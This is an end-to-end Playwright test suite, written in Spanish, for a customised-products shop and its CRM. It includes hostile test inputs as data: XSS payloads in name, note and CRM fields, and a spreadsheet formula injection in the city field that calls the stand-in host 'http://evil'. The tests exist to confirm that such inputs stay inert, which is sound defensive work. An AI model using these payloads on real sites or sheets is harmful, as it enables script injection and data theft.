/* global D, K -- variables de la página del CRM (apps-script/Admin.html), que corre dentro del navegador */
/* Prueba de punta a punta: el sitio real en Chromium, con Google Sheets simulado (pruebas/simulador.js).
   Correr:  node pruebas/sitio.test.js   (necesita Playwright instalado)
   Hace un pedido completo, lo rastrea, sube el comprobante y revisa que nada inyecte código. */
import { createRequire } from 'node:module';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { cargar } from './simulador.js';

// Playwright se busca igual que con require: sirve el instalado en el proyecto o el global
const { chromium } = createRequire(import.meta.url)('playwright');

const RAIZ = path.join(import.meta.dirname, '..');
const TIPOS = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.png': 'image/png', '.jpg': 'image/jpeg' };
// mismas cabeceras de seguridad que Cloudflare (archivo _headers): si la política bloquea algo, la prueba lo ve
const CABECERAS = Object.fromEntries(fs.readFileSync(path.join(RAIZ, '_headers'), 'utf8').split('\n').filter(l => /^\s+\S+:/.test(l)).map(l => { const i = l.indexOf(':'); return [l.slice(0, i).trim(), l.slice(i + 1).trim()]; }));
const server = http.createServer((req, res) => {
  const f = path.join(RAIZ, decodeURIComponent(new URL(req.url, 'http://x').pathname));
  if (!f.startsWith(RAIZ) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) { res.writeHead(404); return res.end(); }
  res.writeHead(200, { ...CABECERAS, 'Content-Type': TIPOS[path.extname(f)] || 'application/octet-stream' }); fs.createReadStream(f).pipe(res);
});

// Abre el diseño de la tarjeta n del catálogo como lo haría una persona: tocándola.
// El personalizador se descarga en ese momento, por eso se espera a que el modal esté abierto.
const abrirTarjeta = async (pg, n) => { await pg.click(`.card[data-card="${n}"]`); await pg.waitForSelector('#custom.open'); await pg.waitForTimeout(600); };

let fallas = 0;
const ok = (c, m) => { console.log(c ? '✓' : '✗', m); if (!c) fallas++; };

(async () => {
  await new Promise(r => server.listen(0, r));
  const base = `http://localhost:${server.address().port}/`;
  const sim = cargar({ silencio: true });
  const token = sim.config('Token del sitio');
  sim.run(`setConfig_('Datos bancarios', 'BAC · Ahorro · 7421 0098 31')`);
  const b = await chromium.launch();
  const ctx = await b.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  const errores = [];
  page.on('pageerror', e => errores.push(e.message));
  const personalizadorBajado = []; page.on('request', r => { if (/\/(personalizador[\w-]*|zoom)\.(js|css)$/.test(new URL(r.url()).pathname) && !/personalizador-carga/.test(r.url())) personalizadorBajado.push(r.url()); });
  const turnstile = []; page.on('request', r => { if (/challenges\.cloudflare\.com/.test(r.url())) turnstile.push(r.url()); });
  page.on('console', m => { if (m.type() === 'error' && /Content Security Policy|Refused/.test(m.text())) errores.push('CSP: ' + m.text()); });
  page.on('dialog', d => { errores.push('dialog: ' + d.message()); d.dismiss(); });
  // Google Sheets simulado: el sitio manda su token real; aquí se cambia por el del simulador
  await page.route(/script\.google\.com/, async route => {
    if (route.request().method() === 'GET') {
      const q = Object.fromEntries(new URL(route.request().url()).searchParams);
      return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sim.get(q)) });
    }
    const body = JSON.parse(route.request().postData() || '{}');
    if (body.accion === 'pedido') sim.ctx.__ocr = `Transferencia BAC\nMonto L ${Math.round(body.total * 0.5)}.00\nRef 8812`;
    if (body.accion === 'comprobante') sim.ctx.__ocr = `Transferencia BAC\nMonto L ${global.saldo}.00\nRef 8813`;
    const out = sim.post({ ...body, token });
    await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(out) });
  });
  await page.route(/fonts\.(googleapis|gstatic)\.com/, r => r.fulfill({ status: 200, body: '' }));

  // 1. catálogo y aviso de privacidad
  await page.goto(base + 'catalogo.html');
  ok(await page.isVisible('#aviso'), 'Aviso de privacidad aparece la primera vez');
  await page.click('[data-aviso="ok"]');
  ok(!(await page.isVisible('#aviso')), 'Aviso se cierra con "Entendido"');
  ok(await page.locator('header.nav .links a').count() >= 4, 'Menú común montado');
  ok(await page.locator('footer a[href="privacidad.html"]').count() > 0, 'Pie con enlace a privacidad');

  // 2. pedido completo con datos maliciosos y anticipo antes de enviar
  const jpg = path.join(import.meta.dirname, 'comprobante.jpg');
  const JPG_B64 = '/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==';
  fs.writeFileSync(jpg, Buffer.from(JPG_B64, 'base64'));
  ok(!personalizadorBajado.length, 'Antes de abrir un producto NO se descargó el personalizador (js ni css)');
  await abrirTarjeta(page, 0);
  ok(personalizadorBajado.length > 0, 'Al abrir un producto se descarga el personalizador (' + personalizadorBajado.length + ' archivos)');
  for (let i = 0; i < 4; i++) { await page.click('#addBtn'); await page.waitForTimeout(150); }
  await page.waitForTimeout(900);
  await page.click('#cartBtn'); await page.click('#goCheckout');
  await page.fill('[name=name]', '<img src=x onerror="window.__xss=1">Ana');
  await page.fill('[name=phone]', '9876 5432');
  await page.fill('[name=email]', 'ana@correo.com');
  await page.fill('[name=city]', '=IMPORTXML("http://evil";"//a")');
  await page.click('#goPago'); await page.waitForTimeout(200);
  ok(await page.isVisible('#e_consent:not(:empty)'), 'Sin aceptar el aviso no deja seguir');
  await page.check('[name=consent]');
  await page.click('#goPago'); await page.waitForTimeout(200);
  ok(await page.isVisible('#anticipoDrop'), 'Paso 2: pagar anticipo');
  ok(await page.isDisabled('#sendOrder'), 'Sin comprobante no deja enviar');
  ok((await page.textContent('.banco')).includes('BAC'), 'Muestra los datos bancarios');
  await page.click('#backDatos'); ok((await page.inputValue('[name=phone]')) === '9876 5432', 'Regresar conserva los datos');
  await page.click('#goPago');
  await page.setInputFiles('#anticipoFile', jpg); await page.waitForTimeout(300);
  await page.waitForTimeout(2300); // un humano tarda: el servidor rechaza envíos instantáneos
  await page.click('#sendOrder');
  await page.waitForSelector('#done.open', { timeout: 15000 }).catch(() => {});
  const done = await page.textContent('#doneTxt');
  const id = (done.match(/PEHN-\d{6}-\d{3}/) || [])[0];
  ok(!!id, 'Pedido enviado, número: ' + id);
  ok(/Recibimos tu anticipo/.test(done), 'Anticipo leído al enviar');
  const fila = sim.hoja('Pedidos')[0] || {};
  ok(fila.Ciudad && fila.Ciudad.texto, 'La ciudad con fórmula quedó como texto en la hoja');
  ok(sim.hoja('Partidas').length === 1 && String(sim.hoja('Partidas')[0]['Archivo vista previa']).includes('drive'), 'Foto del diseño guardada en Drive');
  ok(sim.hoja('Pagos').length === 1 && sim.hoja('Pagos')[0].Resultado === 'Coincide', 'Comprobante en Pagos: Coincide');

  // 3. Mis pedidos: el pedido aparece solo, con lo pagado
  await page.goto(base + 'pedido.html');
  await page.waitForSelector('#misLista [data-mio]', { timeout: 8000 }).catch(() => {});
  ok(await page.locator('#misLista [data-mio]').count() === 1, 'Mis pedidos lista el pedido');
  ok(/Pagado/.test(await page.textContent('#misLista')), 'La tarjeta dice cuánto lleva pagado');
  await page.click('#misLista [data-mio]');
  await page.waitForSelector('.ped-card', { timeout: 8000 });
  ok((await page.textContent('.ped-card')).includes(id), 'Muestra el detalle');
  ok(!(await page.textContent('.ped-card')).includes('Ana'), 'No muestra el nombre del cliente');

  // 4. comprobante del saldo desde Mis pedidos
  global.saldo = Math.round(Number(fila.Total)) - Math.round(Number(fila.Total) * 0.5);
  await page.setInputFiles('#voucher', jpg);
  await page.waitForTimeout(400);
  await page.click('#sendVoucher');
  await page.waitForFunction(() => !document.querySelector('#sendVoucher'), null, { timeout: 8000 }).catch(() => {});
  ok(sim.hoja('Pagos').length === 2 && sim.hoja('Pagos')[1].Resultado === 'Coincide', 'Comprobante del saldo leído');
  ok(/pagado por completo/.test(await page.textContent('.ped-card')), 'Pedido queda pagado por completo');
  fs.unlinkSync(jpg);

  // 5. teléfono equivocado
  await page.fill('[name=phone]', '9111 2222'); await page.click('#seguirBtn'); await page.waitForTimeout(400);
  ok(/No encontramos/.test(await page.textContent('#seguirErr')), 'WhatsApp ajeno no ve el pedido');

  // 6. contenido editable desde el CRM
  const k = JSON.stringify(sim.config('Clave del CRM'));
  sim.run(`crm(${k}, "sitio", { cambios: [{ clave: 'anuncio', valor: 'Envíos gratis esta semana' }, { clave: 'hero.titulo', valor: '<img src=x onerror="window.__xss=1">Hola' }, { clave: 'color.marca', valor: '#3355AA' }, { clave: 'faq.2.p', valor: '' }, { clave: 'contacto.whatsapp', valor: '50499998888' }] })`);
  await page.goto(base + 'index.html'); await page.waitForTimeout(600);
  ok((await page.textContent('.announce')) === 'Envíos gratis esta semana', 'Anuncio cambiado desde el CRM');
  ok((await page.textContent('[data-edit="hero.titulo"]')).startsWith('<img'), 'Texto con HTML se muestra como texto');
  ok((await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--brand').trim().toUpperCase())) === '#3355AA', 'Color de marca cambiado');
  ok(await page.evaluate(() => document.querySelector('[data-edit="faq.2.p"]').closest('details').hidden), 'Pregunta vacía se oculta');
  ok((await page.getAttribute('.wa-float', 'href')).includes('50499998888'), 'WhatsApp nuevo en los botones');

  // 7. resto de páginas
  for (const p of ['index.html', 'privacidad.html']) { await page.goto(base + p); await page.waitForTimeout(300); ok(await page.locator('header.nav').count() === 1, p + ' carga con menú'); }
  await page.click('#borrarDatos');
  ok(await page.evaluate(() => !localStorage.getItem('pehn_pedidos') && !localStorage.getItem('pehn_contact')), 'Botón borrar limpia el navegador');

  // 8. teléfono: el personalizador es una página con historial (390×844, táctil)
  {
    const mctx = await b.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
    const m = await mctx.newPage();
    m.on('pageerror', e => errores.push('móvil: ' + e.message));
    await m.route(/fonts\.(googleapis|gstatic)\.com|script\.google\.com/, r => r.fulfill({ status: 200, body: '{}' }));
    await m.addInitScript(() => localStorage.setItem('pehn_aviso', '1'));
    await m.goto(base + 'catalogo.html');
    await abrirTarjeta(m, 0);
    ok(await m.evaluate(() => document.querySelector('#custom').classList.contains('pg')), 'Móvil: el cuadro abre como página');
    ok((await m.textContent('#cSub')).includes('Paso 1 de 4'), 'Móvil: barra superior con "Paso 1 de 4"');
    const pasos = await m.evaluate(() => { const r = document.querySelector('.steps-nav').getBoundingClientRect(); return r.right <= innerWidth && document.documentElement.scrollWidth <= innerWidth; });
    ok(pasos, 'Móvil: barra de pasos entera, sin scroll horizontal');
    await m.click('.figrow'); await m.waitForTimeout(400);
    ok((await m.textContent('#cScreen')) === 'Figura 1', 'Móvil: la figura 1 se edita en su sub-pantalla');
    ok(await m.evaluate(() => document.activeElement.id === 'cScreen'), 'Móvil: el foco va al título de la pantalla');
    await m.click('.fsec.open [data-g="hair"][data-v]:not([aria-pressed="true"])'); await m.waitForTimeout(200);
    const elegido = '.fsec.open [data-g="hair"][aria-pressed="true"]';
    const etiqueta = (await m.textContent(elegido)).trim(), peinado = await m.getAttribute(elegido, 'data-v');
    await m.click('.sec-h[data-sec="fcara"]'); // plegar
    ok((await m.textContent('[data-secsum="cara"]')).includes('Peinado: ' + etiqueta), 'Móvil: el encabezado plegado muestra la elección (Peinado: ' + etiqueta + ')');
    await m.evaluate(() => history.back()); await m.waitForTimeout(500);
    ok(await m.evaluate(() => !document.querySelector('#custom .sheet').classList.contains('sub') && document.querySelectorAll('.figrow').length === 2), 'Móvil: Atrás del navegador vuelve a la lista de figuras');
    ok((await m.textContent('.figrow')).includes(etiqueta) && peinado, 'Móvil: lo elegido se conserva (la lista de figuras muestra "' + etiqueta + '")');
    for (let i = 0; i < 3; i++) { await m.click('#addBtn'); await m.waitForTimeout(250); }
    ok((await m.textContent('#addLabel')) === 'Agregar al pedido', 'Móvil: último paso con "Agregar al pedido"');
    const tam = await m.evaluate(() => [...document.querySelectorAll('#cForm button, #addBtn, #backBtn, #brkBtn')].filter(e => e.offsetParent).every(e => { const r = e.getBoundingClientRect(); return r.height >= 43.5 && r.width >= 43.5; }));
    ok(tam, 'Móvil: botones táctiles de al menos 44 px');
    await m.click('#addBtn'); await m.waitForTimeout(900);
    ok(await m.evaluate(() => !document.querySelector('#custom').classList.contains('open') && JSON.parse(localStorage.getItem('pehn_cart') || '[]').length === 1), 'Móvil: agregar al pedido cierra la página y queda en el carrito');
    // borrador: salir sin agregar ofrece seguir
    await abrirTarjeta(m, 0);
    await m.click('.figrow'); await m.waitForTimeout(300);
    await m.click('.sec-h[data-sec="fropa"]'); await m.click('.fsec.open [data-g="outfit"][data-v]:not([aria-pressed="true"])');
    await m.click('#cBack'); await m.waitForTimeout(300); await m.click('#cBack'); await m.waitForTimeout(900);
    await abrirTarjeta(m, 0);
    ok(await m.isVisible('[data-draft="si"]'), 'Móvil: al volver ofrece "Seguir con tu diseño"');
    await m.close();
    // 360 px: nada se sale de la pantalla en ningún paso
    const c360 = await b.newContext({ viewport: { width: 360, height: 740 }, isMobile: true, hasTouch: true });
    const q = await c360.newPage();
    await q.route(/fonts\.(googleapis|gstatic)\.com|script\.google\.com/, r => r.fulfill({ status: 200, body: '{}' }));
    await q.addInitScript(() => localStorage.setItem('pehn_aviso', '1'));
    await q.goto(base + 'catalogo.html'); await abrirTarjeta(q, 0);
    let sinScroll = true;
    for (let i = 0; i < 4; i++) { sinScroll = sinScroll && await q.evaluate(() => document.documentElement.scrollWidth <= innerWidth && document.querySelector('#cForm').scrollWidth <= document.querySelector('#cForm').clientWidth + 1); if (i < 3) { await q.click('#addBtn'); await q.waitForTimeout(400); } }
    ok(sinScroll, 'Móvil 360 px: sin scroll horizontal en los 4 pasos');
    await mctx.close(); await c360.close();
  }

  // 9. catálogo: columna de filtros con categorías desplegables (escritorio) y cajón (teléfono)
  {
    const d = await ctx.newPage();
    d.on('pageerror', e => errores.push('filtros: ' + e.message));
    await d.route(/fonts\.(googleapis|gstatic)\.com|script\.google\.com/, r => r.fulfill({ status: 200, body: '{}' }));
    await d.addInitScript(() => localStorage.setItem('pehn_aviso', '1'));
    await d.goto(base + 'catalogo.html'); await d.waitForTimeout(400);
    ok(await d.isVisible('#side') && !(await d.isVisible('#fBtn')), 'Escritorio: filtros en columna fija, sin botón Filtros');
    ok(await d.getAttribute('[data-acc="ropa"]', 'aria-expanded') === 'false' && await d.isHidden('[data-cat="ropa"][data-sub="pijamas"]'), 'Escritorio: Ropa empieza plegada');
    await d.click('[data-acc="ropa"]'); await d.waitForTimeout(500);
    ok(await d.getAttribute('[data-acc="ropa"]', 'aria-expanded') === 'true' && await d.isVisible('[data-cat="ropa"][data-sub="pijamas"]'), 'Escritorio: Ropa se despliega y muestra sus subcategorías');
    ok(await d.getAttribute('[data-acc="ropa"]', 'aria-controls') === 'as-ropa' && await d.locator('#as-ropa').count() === 1, 'Acordeón: aria-controls apunta a su panel');
    await d.click('[data-cat="ropa"][data-sub="pijamas"]'); await d.waitForTimeout(600);
    const tarjetas = await d.$$eval('#grid .card', l => l.map(c => [c.querySelector('.card-cat').textContent, c.querySelector('h3').textContent]));
    ok(tarjetas.length === 6 && tarjetas.every(t => t[0] === 'Ropa' && /pijama/i.test(t[1])), 'Escritorio: Pijamas deja solo pijamas (' + tarjetas.length + ')');
    const u = new URL(d.url());
    ok(u.searchParams.get('cat') === 'ropa' && u.searchParams.get('sub') === 'pijamas', 'URL lleva ?cat=ropa&sub=pijamas');
    ok(await d.getAttribute('[data-cat="ropa"][data-sub="pijamas"]', 'aria-current') === 'true', 'Subcategoría activa marcada (aria-current)');
    ok((await d.textContent('#chip')).includes('Pijamas') && (await d.textContent('#resCount')).startsWith('6 '), 'Chip del filtro activo y conteo de resultados');
    await d.click('[data-acc="vasos"]'); await d.waitForTimeout(500);
    ok(await d.getAttribute('[data-acc="ropa"]', 'aria-expanded') === 'false' && await d.getAttribute('[data-acc="vasos"]', 'aria-expanded') === 'true', 'Solo una categoría abierta a la vez');
    await d.focus('[data-acc="vasos"]'); await d.keyboard.press('ArrowDown');
    ok(await d.evaluate(() => document.activeElement.dataset.sub === ''), 'Teclado: flecha abajo pasa al primer elemento de la categoría abierta');
    await d.click('#chip'); await d.waitForTimeout(500);
    ok(!/[?&](cat|sub)=/.test(d.url()) && await d.$$eval('#grid .card', l => l.length) === 8, 'La × del chip quita el filtro y limpia la URL');
    await d.goto(base + 'catalogo.html?cat=vasos'); await d.waitForTimeout(500);
    ok(await d.$$eval('#grid .card', l => l.length > 0 && l.every(c => c.querySelector('.card-cat').textContent === 'Vasos y tazas')) && await d.getAttribute('[data-acc="vasos"]', 'aria-expanded') === 'true', 'Enlace viejo ?cat=vasos sigue funcionando');
    await d.goto(base + 'catalogo.html?cat=ropa&sub=inventada'); await d.waitForTimeout(400);
    ok(await d.$$eval('#grid .card', l => l.length) === 8 && !(await d.textContent('#chip')).includes('inventada'), 'Subcategoría desconocida en la URL se ignora');
    await d.close();

    const fctx = await b.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
    const m = await fctx.newPage();
    m.on('pageerror', e => errores.push('filtros móvil: ' + e.message));
    await m.route(/fonts\.(googleapis|gstatic)\.com|script\.google\.com/, r => r.fulfill({ status: 200, body: '{}' }));
    await m.addInitScript(() => localStorage.setItem('pehn_aviso', '1'));
    await m.goto(base + 'catalogo.html'); await m.waitForTimeout(500);
    ok(await m.isVisible('#fBtn') && !(await m.isVisible('#side')) && await m.isVisible('#buscar #q'), 'Móvil: una fila con buscador y botón Filtros; sin columna fija');
    ok(await m.evaluate(() => document.documentElement.scrollWidth <= innerWidth), 'Móvil: sin scroll horizontal con la barra compacta');
    await m.click('#fBtn'); await m.waitForTimeout(700);
    ok(await m.isVisible('#side .side-panel') && await m.getAttribute('#fBtn', 'aria-expanded') === 'true', 'Móvil: Filtros abre el cajón');
    ok(await m.evaluate(() => document.querySelector('.shop-main').inert && !document.querySelector('#sidePanel').inert && document.activeElement.id === 'sidePanel'), 'Móvil: el resto queda inerte y el foco va al cajón');
    await m.click('[data-acc="ropa"]'); await m.waitForTimeout(500);
    const medidas = await m.evaluate(() => [...document.querySelectorAll('#side .acc-h, #side .acc-s, #side .x, #fApply')].filter(e => e.getBoundingClientRect().height > 0 && getComputedStyle(e).visibility === 'visible' && getComputedStyle(e.closest('ul') || e).visibility === 'visible').every(e => { const r = e.getBoundingClientRect(); return r.height >= 43.5 && r.width >= 43.5; }));
    ok(medidas, 'Móvil: filas y botones del cajón de al menos 44 px');
    ok(await m.evaluate(() => document.documentElement.scrollWidth <= innerWidth), 'Móvil: cajón abierto sin scroll horizontal');
    await m.click('[data-cat="ropa"][data-sub="pijamas"]'); await m.waitForTimeout(500);
    ok((await m.textContent('#fApply')) === 'Ver 6 productos', 'Móvil: el botón fijo dice "Ver 6 productos"');
    await m.click('#fApply'); await m.waitForTimeout(700);
    ok(!(await m.isVisible('#side')) && await m.getAttribute('#fBtn', 'aria-expanded') === 'false', 'Móvil: "Ver productos" cierra el cajón');
    ok(await m.$$eval('#grid .card', l => l.length === 6 && l.every(c => /pijama/i.test(c.querySelector('h3').textContent))), 'Móvil: el grid quedó filtrado en pijamas');
    ok((await m.textContent('#fBadge')) === '1' && /sub=pijamas/.test(m.url()), 'Móvil: el botón muestra el número de filtros y la URL el filtro');
    ok(await m.evaluate(() => !document.querySelector('main').inert && !document.querySelector('.shop-main').inert), 'Móvil: al cerrar nada queda inerte');
    await m.click('#fBtn'); await m.waitForTimeout(600);
    ok(await m.isVisible('#side .side-panel'), 'Móvil: se vuelve a abrir');
    await m.goBack(); await m.waitForTimeout(600);
    ok(!(await m.isVisible('#side')) && /catalogo\.html/.test(m.url()) && /sub=pijamas/.test(m.url()), 'Móvil: Atrás cierra el cajón y se queda en el catálogo');
    await m.click('#fBtn'); await m.waitForTimeout(600); await m.keyboard.press('Escape'); await m.waitForTimeout(600);
    ok(!(await m.isVisible('#side')), 'Móvil: Escape cierra el cajón');
    await m.click('#fBtn'); await m.waitForTimeout(600); await m.mouse.click(385, 400); await m.waitForTimeout(600);
    ok(!(await m.isVisible('#side')), 'Móvil: tocar fuera cierra el cajón');
    await m.click('#fBtn'); await m.waitForTimeout(600); await m.click('#side .x'); await m.waitForTimeout(600);
    ok(!(await m.isVisible('#side')) && await m.evaluate(() => document.activeElement.id === 'fBtn'), 'Móvil: la × cierra el cajón y el foco vuelve al botón');
    await fctx.close();

    const c360 = await b.newContext({ viewport: { width: 360, height: 740 }, isMobile: true, hasTouch: true });
    const q = await c360.newPage();
    await q.route(/fonts\.(googleapis|gstatic)\.com|script\.google\.com/, r => r.fulfill({ status: 200, body: '{}' }));
    await q.addInitScript(() => localStorage.setItem('pehn_aviso', '1'));
    await q.goto(base + 'catalogo.html?cat=ropa&sub=pijamas'); await q.waitForTimeout(500);
    const ancho1 = await q.evaluate(() => document.documentElement.scrollWidth <= innerWidth);
    await q.click('#fBtn'); await q.waitForTimeout(600);
    const ancho2 = await q.evaluate(() => document.documentElement.scrollWidth <= innerWidth && document.querySelector('.side-body').scrollWidth <= document.querySelector('.side-body').clientWidth);
    ok(ancho1 && ancho2, 'Móvil 360 px: catálogo y cajón de filtros sin scroll horizontal');
    await c360.close();
  }

  // CRM: el HTML que genera el servidor con datos hostiles (<!--<script>) debe seguir corriendo y no ejecutar nada
  {
    const adm = cargar({ silencio: true, usuario: 'duenos@pehn.test' });
    const malo = '<!--<script>window.__xss=1</script> </script><script>window.__xss=1</script>';
    adm.post({ token: adm.config('Token del sitio'), fillMs: 9000, website: '', customer: { name: malo, phone: '9876 5432', email: '', city: malo, date: '', notes: malo },
      items: [{ product: 'Cuadro', qty: 1, total: 750, options: [], bom: [] }], total: 750, currency: 'HNL', comprobante: 'data:image/jpeg;base64,/9j/4AAQ' });
    const html = adm.run(`crmHtml_('"</script><script>window.__xss=1</script>')`).getContent();
    const crm = await b.newPage();
    const errCrm = []; crm.on('pageerror', e => errCrm.push(e.message));
    await crm.addInitScript(() => { window.google = { script: { run: new Proxy({}, { get: () => function () { return this; } }) } }; });
    await crm.setContent(html); await crm.waitForTimeout(400);
    ok(await crm.evaluate(() => typeof D === 'object' && D && D.pedidos.length === 1 && D.pedidos[0].cliente.startsWith('<!--<script>')), 'CRM: con datos "<!--<script>" el script corre y D queda definido');
    ok(await crm.evaluate(() => K === '' && !window.__xss), 'CRM: ?k= ajeno no se refleja y nada ejecuta código');
    ok(!errCrm.length, 'CRM: sin errores de JavaScript' + (errCrm.length ? ': ' + errCrm.join(' | ') : ''));
    await crm.close();
  }

  // Turnstile activado (llave de prueba y script falso de Cloudflare): sin token no envía; con token lo manda; tras un error lo reinicia
  {
    const tctx = await b.newContext({ viewport: { width: 1280, height: 900 } });
    const t = await tctx.newPage(); const tErr = [];
    t.on('pageerror', e => tErr.push(e.message));
    t.on('console', m => { if (m.type() === 'error' && /Content Security Policy|Refused/.test(m.text())) tErr.push('CSP: ' + m.text()); });
    await t.addInitScript(() => localStorage.setItem('pehn_aviso', '1'));
    await t.route(/fonts\.(googleapis|gstatic)\.com/, r => r.fulfill({ status: 200, body: '' }));
    await t.route(/\/datos\.js$/, async r => { const res = await r.fetch(); await r.fulfill({ response: res, body: (await res.text()).replace("turnstileSiteKey: ''", "turnstileSiteKey: 'LLAVE-PRUEBA'") }); });
    await t.route(/challenges\.cloudflare\.com/, r => r.fulfill({ status: 200, contentType: 'text/javascript', body: 'window.turnstile={render:function(el,o){window.__tsOpts=o;return 7},reset:function(w){window.__tsReset=w}};' }));
    let enviado = null;
    await t.route(/script\.google\.com/, async r => {
      if (r.request().method() === 'GET') return r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sim.get(Object.fromEntries(new URL(r.request().url()).searchParams))) });
      enviado = JSON.parse(r.request().postData() || '{}');
      await r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ ok: false, error: 'Verificación fallida. Recarga la página e intenta de nuevo.' }) });
    });
    await t.goto(base + 'catalogo.html');
    await abrirTarjeta(t, 0);
    for (let i = 0; i < 4; i++) { await t.click('#addBtn'); await t.waitForTimeout(150); }
    await t.waitForTimeout(900);
    await t.click('#cartBtn'); await t.click('#goCheckout');
    await t.fill('[name=name]', 'Ana'); await t.fill('[name=phone]', '9876 5432'); await t.fill('[name=email]', 'ana@correo.com'); await t.fill('[name=city]', 'Tegucigalpa');
    await t.check('[name=consent]'); await t.click('#goPago'); await t.waitForTimeout(200);
    await t.waitForFunction(() => window.__tsOpts, null, { timeout: 5000 }).catch(() => {});
    ok(await t.evaluate(() => window.__tsOpts && window.__tsOpts.sitekey === 'LLAVE-PRUEBA'), 'Turnstile: el widget se monta con la llave de datos.js (CSP lo permite)');
    await t.setInputFiles('#anticipoFile', { name: 'c.jpg', mimeType: 'image/jpeg', buffer: Buffer.from(JPG_B64, 'base64') }); await t.waitForTimeout(2800);
    await t.click('#sendOrder'); await t.waitForTimeout(300);
    ok(enviado === null && /verificando/.test(await t.textContent('#coErr')), 'Turnstile: sin token no se envía el pedido');
    await t.evaluate(() => window.__tsOpts.callback('tok-123'));
    await t.click('#sendOrder'); await t.waitForTimeout(1500);
    ok(enviado && enviado.turnstile === 'tok-123', 'Turnstile: el token viaja con el pedido');
    ok(await t.evaluate(() => window.__tsReset === 7), 'Turnstile: tras un error se pide otro token');
    ok(!tErr.length, 'Turnstile: sin errores de JavaScript ni CSP' + (tErr.length ? ': ' + tErr.join(' | ') : ''));
    await tctx.close();
  }

  ok(!turnstile.length, 'Sin turnstileSiteKey no se carga nada de Cloudflare Turnstile');
  ok(!(await page.evaluate(() => window.__xss)), 'Ningún texto del cliente ejecutó código');
  ok(!errores.length, 'Sin errores de JavaScript' + (errores.length ? ': ' + errores.join(' | ') : ''));
  await b.close(); server.close();
  console.log(fallas ? `\n${fallas} fallaron` : '\nTodo pasó');
  process.exit(fallas ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
